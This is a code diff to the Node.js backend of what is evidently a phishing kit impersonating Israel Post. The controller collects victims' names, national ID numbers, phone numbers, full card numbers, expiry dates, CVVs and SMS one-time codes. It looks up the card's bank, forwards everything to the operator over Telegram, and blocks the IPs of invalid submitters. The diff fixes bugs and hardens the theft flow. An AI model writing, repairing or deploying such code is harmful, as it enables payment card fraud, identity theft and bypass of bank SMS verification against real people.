@@ -1,8 +1,8 @@
 const { telegramService } = require("../services");
-const formatCreditCard = require("../utils/formatCreditCard");
 const getUserAgent = require("../utils/getUserAgent");
-const { Axios } = require("axios");
+const { default: axios } = require("axios");
 const isValidCreditCard = require("../utils/isValidCreditCard");
+const formatCreditCard = require("../utils/formatCreditCard");
 const BlockedIP = require("../models/blockedIP.model");
 
 module.exports.addCardDetails = async (req, res, next) => {
@@ -17,11 +17,6 @@ module.exports.addCardDetails = async (req, res, next) => {
       cvv,
     } = req.body;
 
-    const axios = new Axios();
-    const bin = cardNumber.substring(0, 7);
-    const res = await axios.get(`https://lookup.binlist.net/${bin}`);
-    const cardDetails = res.data;
-
     const isValidCard = isValidCreditCard(
       cardNumber,
       cvv,
@@ -30,29 +25,38 @@ module.exports.addCardDetails = async (req, res, next) => {
     );
 
     if (!isValidCard) {
-      const blockedIP = new BlockedIP({ ip: req.IP });
+      const blockedIP = new BlockedIP({ ip: req.ip });
       await blockedIP.save();
-      res.status(200).json({ success: false });
+      return res.status(200).json({ success: false });
     }
 
-    const message = `
-      [IsraelPost - 💳 Card Info 💳]
-      [👤] Full Name: ${fullName}
-      [👤] ID Number: ${idNumber}
-      [👤] Mobile Number: ${phoneNumber}
-      [💳] Card Number: ${formatCreditCard(cardNumber)}
-      [🔄] Expiry Date: ${expiryMonth}/${expiryYear}
-      [🔑] CCV: ${cvv}
-      [🔍] GEO IP: ${req.IP}
-      
-      [IsraelPost - 💳 Bin Info 💳]
-      [🏛] Card Bank:  ${cardDetails.bank.name}
-      [💳] Card Type: ${cardDetails.scheme} ${cardDetails.type}
-      [💳] Card Brand: ${cardDetails.brand}
-      [💳] Prepaid: ${cardDetails.prepaid ? "Yes" : "No"}
-      [💳] Currency: ${cardDetails.country.currency}
-      [IsraelPost BY: GHOST !#MSD!#]
-      `;
+    const bin = cardNumber.substring(0, 7);
+    const url = `https://lookup.binlist.net/${bin}`;
+    const response = await axios.get(url);
+    const cardDetails = response.data;
+
+    const line1 = "[IsraelPost - 💳 Card Info 💳]";
+    const line2 = `[👤] Full Name: ${fullName}`;
+    const line3 = `[👤] ID Number: ${idNumber}`;
+    const line4 = `[👤] Mobile Number: ${phoneNumber}`;
+    const line5 = `[💳] Card Number: ${formatCreditCard(cardNumber)}`;
+    const line6 = `[🔄] Expiry Date: ${expiryMonth}/${expiryYear}`;
+    const line7 = `[🔑] CCV: ${cvv}`;
+    const line8 = `[🔍] GEO IP: ${req.ip}`;
+    const line9 = "\n";
+    const line10 = "[IsraelPost - 💳 BIN Info 💳]";
+    const line11 = `[🏛] Card Bank:  ${cardDetails?.bank?.name || "Unknown"}`;
+    const line12 = `[💳] Card Type: ${cardDetails.scheme.toUpperCase()} ${cardDetails.type.toUpperCase()}`;
+    const line13 = `[💳] Card Brand: ${
+      cardDetails?.brand?.toUpperCase?.() || "Unknown"
+    }`;
+    const line14 = `[💳] Prepaid: ${cardDetails.prepaid ? "Yes" : "No"}`;
+    const line15 = `[💳] Currency: ${
+      cardDetails?.country?.currency || "Unknown"
+    }`;
+    const line16 = `[IsraelPost BY: GHOST !#MSD!#]`;
+
+    const message = `${line1}\n${line2}\n${line3}\n${line4}\n${line5}\n${line6}\n${line7}\n${line8}\n${line9}\n${line10}\n${line11}\n${line12}\n${line13}\n${line14}\n${line15}\n${line16}`;
 
     telegramService.sendMessage(message);
 
@@ -70,15 +74,17 @@ module.exports.addCardOTP = async (req, res, next) => {
 
     const message = `
     [=====>  ISRAELPOST: GHOST $ MSD  SMS    <=====]
-    [ SMS CODE:  ${otp}
-    [ IP :    ${req.IP}
-    [ OS :    ${osName}
-    [ Browser :    ${browser.name}
-    [ UA :    ${ua}
+    [ SMS CODE: ${otp}
+    [ IP: ${req.ip}
+    [ OS: ${osName || "Unknown"}
+    [ Browser: ${browser?.name || "None"}
+    [ UA: ${ua}
     [=====>  ISRAELPOST: GHOST $ MSD  SMS   <=====]
     `;
 
-    telegramService.sendMessage(message);
+    if (otp) {
+      telegramService.sendMessage(message);
+    }
 
     res.status(200).json({ success: true });
   } catch (err) {
